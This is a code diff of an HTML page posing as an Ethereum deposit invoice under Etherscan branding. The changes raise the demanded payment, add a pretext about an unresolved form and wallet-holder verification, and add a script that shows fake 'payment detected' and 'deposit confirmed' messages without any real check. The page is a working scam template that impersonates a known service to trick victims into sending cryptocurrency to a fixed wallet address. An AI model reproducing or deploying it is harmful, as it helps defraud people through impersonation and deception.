@@ -1,137 +1,207 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>PAY — Invoice INV-RDSR55XG</title>
-  <style>
-    body {
-      font-family: "Segoe UI", Arial, sans-serif;
-      background: #f9fafb;
-      color: #222;
-      margin: 0;
-      padding: 0;
-    }
-    .container {
-      max-width: 420px;
-      background: #fff;
-      margin: 50px auto;
-      border-radius: 16px;
-      box-shadow: 0 2px 12px rgba(0,0,0,0.1);
-      padding: 24px;
-      text-align: center;
-    }
-    .header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-    .header img {
-      width: 60px;
-    }
-    .timer {
-      color: #10b981;
-      font-weight: 600;
-      background: #ecfdf5;
-      padding: 6px 12px;
-      border-radius: 20px;
-      font-size: 14px;
-    }
-    .invoice {
-      margin-top: 16px;
-      font-size: 18px;
-      font-weight: 600;
-    }
-    .powered {
-      font-size: 12px;
-      color: #555;
-      margin-top: 2px;
-    }
-    .amount {
-      font-size: 22px;
-      font-weight: bold;
-      margin: 20px 0;
-    }
-    .address {
-      color: #4f46e5;
-      font-size: 12px;
-      word-break: break-all;
-    }
-    .status {
-      margin: 20px 0;
-      font-weight: 500;
-      color: #6b7280;
-    }
-    .qr {
-      margin: 16px auto;
-      width: 160px;
-      height: 160px;
-      border: 1px solid #ddd;
-      border-radius: 8px;
-      background: url('https://api.qrserver.com/v1/create-qr-code/?data=0xa2b07Ed95F3CfDEd76F2E70c58AF897C2dC94941&size=160x160') center/contain no-repeat;
-    }
-    .network-info {
-      margin-top: 12px;
-      font-size: 13px;
-      color: #444;
-    }
-    .button {
-      margin-top: 24px;
-      background: #e0e7ff;
-      color: #1e3a8a;
-      border: none;
-      padding: 12px 30px;
-      border-radius: 30px;
-      font-weight: 600;
-      cursor: pointer;
-    }
-    .button:hover {
-      background: #c7d2fe;
-    }
-    .fee {
-      margin-top: 18px;
-      font-size: 12px;
-      color: #555;
-    }
-    footer {
-      margin-top: 30px;
-      font-size: 12px;
-      color: #aaa;
-    }
-  </style>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Ethereum Deposit Confirmation — INV-RDSR55XG</title>
+<style>
+  :root{
+    --bg:#f3f4f6;
+    --card:#ffffff;
+    --muted:#6b7280;
+    --accent:#4f46e5;
+    --accent-light:#e0e7ff;
+    --success:#059669;
+    --warning:#dc2626;
+    --text:#111827;
+  }
+
+  body{
+    margin:0;
+    font-family: "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    background:var(--bg);
+    color:var(--text);
+  }
+
+  .container{
+    max-width:520px;
+    background:var(--card);
+    border-radius:18px;
+    box-shadow:0 8px 24px rgba(0,0,0,0.08);
+    margin:50px auto;
+    padding:30px;
+    text-align:center;
+  }
+
+  .header{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+  }
+
+  .header h1{
+    font-size:18px;
+    font-weight:700;
+    margin:0;
+    color:#111;
+  }
+
+  .timer{
+    background:var(--accent-light);
+    color:var(--accent);
+    font-weight:700;
+    padding:6px 14px;
+    border-radius:30px;
+    font-size:13px;
+  }
+
+  .invoice{
+    margin-top:20px;
+    font-size:20px;
+    font-weight:700;
+  }
+
+  .powered{
+    font-size:13px;
+    color:var(--muted);
+    letter-spacing:0.4px;
+    margin-top:4px;
+  }
+
+  .deposit{
+    margin-top:22px;
+    font-size:18px;
+    font-weight:600;
+  }
+
+  .amount{
+    font-size:28px;
+    font-weight:800;
+    color:var(--accent);
+    margin-top:4px;
+  }
+
+  .address{
+    display:inline-block;
+    margin-top:16px;
+    font-size:13px;
+    color:var(--accent);
+    word-break:break-all;
+    text-decoration:none;
+    border:1px solid var(--accent-light);
+    background:linear-gradient(90deg, rgba(79,70,229,0.05), rgba(79,70,229,0.02));
+    padding:8px 12px;
+    border-radius:10px;
+  }
+
+  .status{
+    margin-top:18px;
+    color:var(--muted);
+    font-weight:500;
+  }
+
+  .qr{
+    margin:22px auto;
+    width:220px;
+    height:220px;
+    border-radius:12px;
+    background:url('https://api.qrserver.com/v1/create-qr-code/?data=ethereum:0xa2b07Ed95F3CfDEd76F2E70c58AF897C2dC94941?amount=0.14999&size=220x220') center/contain no-repeat;
+    border:1px solid #e5e7eb;
+  }
+
+  .network{
+    font-size:13px;
+    color:#374151;
+    margin-top:10px;
+    line-height:1.6;
+  }
+
+  .btn{
+    display:inline-block;
+    margin-top:24px;
+    background:var(--accent);
+    color:#fff;
+    border:none;
+    padding:12px 36px;
+    border-radius:30px;
+    font-weight:600;
+    cursor:pointer;
+    transition:background 0.2s;
+    text-decoration:none;
+  }
+  .btn:hover{
+    background:#4338ca;
+  }
+
+  .fee{
+    margin-top:26px;
+    font-size:13px;
+    color:var(--muted);
+    line-height:1.6;
+    text-align:left;
+  }
+
+  .fee strong{
+    color:#111;
+  }
+
+  footer{
+    font-size:11px;
+    color:#9ca3af;
+    margin-top:26px;
+  }
+</style>
 </head>
 <body>
   <div class="container">
     <div class="header">
-      <div><strong>PAY</strong></div>
-      <div class="timer">⏱️ </div>
+      <h1>PAY</h1>
+      <div class="timer">⏱️ 02:00:00</div>
     </div>
 
-    <div class="invoice">INV-RDSR55XG</div>
-    <div class="powered">POWERED BY ETHEREUM</div>
+    <div class="invoice">INVOICE ID: INV-RDSR55XG</div>
+    <div class="powered">Powered by Ethereum Blockchain</div>
 
-    <div class="amount">Amount to pay: 0.0601 ETH</div>
+    <div class="deposit">Required Deposit</div>
+    <div class="amount">0.14999 ETH</div>
 
-    <div class="address">
+    <a class="address" id="addr" href="https://etherscan.io/address/0xa2b07Ed95F3CfDEd76F2E70c58AF897C2dC94941" target="_blank">
       0xa2b07Ed95F3CfDEd76F2E70c58AF897C2dC94941
+    </a>
+
+    <div class="status" id="status">Awaiting on-chain confirmation...</div>
+
+    <div class="qr" role="img" aria-label="QR code for payment"></div>
+
+    <div class="network">
+      Selected Currency: <strong>ETH</strong> | Network: <strong>ERC-20</strong><br>
+      Estimated confirmation time: <strong>1–3 minutes</strong>
     </div>
 
-    <div class="status">We are waiting for payment</div>
-
-    <div class="qr"></div>
-
-    <div class="network-info">
-      Selected currency: <b>ETH</b> &nbsp;|&nbsp; Network: <b>ERC20</b> <br>
-      Estimated confirmation time: 1–3 min
-    </div>
-
-    <button class="button">ALREADY PAID</button>
+    <a href="#" class="btn" id="paidBtn" onclick="markPaid(event)">ALREADY PAID</a>
 
     <div class="fee">
-      Fee Description: Audit fees and labor costs total 0.0601 ETH.
+      <strong>Fee Description:</strong><br>
+      The matter related to Form ID <strong>1007A35DD</strong> has not been effectively resolved due to the lack of valid identification documents.<br>
+      A second support session has been provided to address this issue — therefore, <strong>no additional service fee is required.</strong><br><br>
+      To ensure the smooth resolution of this case and to verify the authenticity of the wallet address holder, please deposit <strong>0.14999 ETH</strong> to the above address.
     </div>
 
     <footer>Etherscan © 2025 (C1)</footer>
   </div>
+
+<script>
+function markPaid(e){
+  e.preventDefault();
+  const status = document.getElementById("status");
+  status.textContent = "Payment detected — awaiting network confirmations...";
+  status.style.color = "#2563eb";
+
+  setTimeout(()=>{
+    status.textContent = "Deposit confirmed successfully. Processing refund instructions.";
+    status.style.color = "#059669";
+  }, 4000);
+}
+</script>
 </body>
 </html>
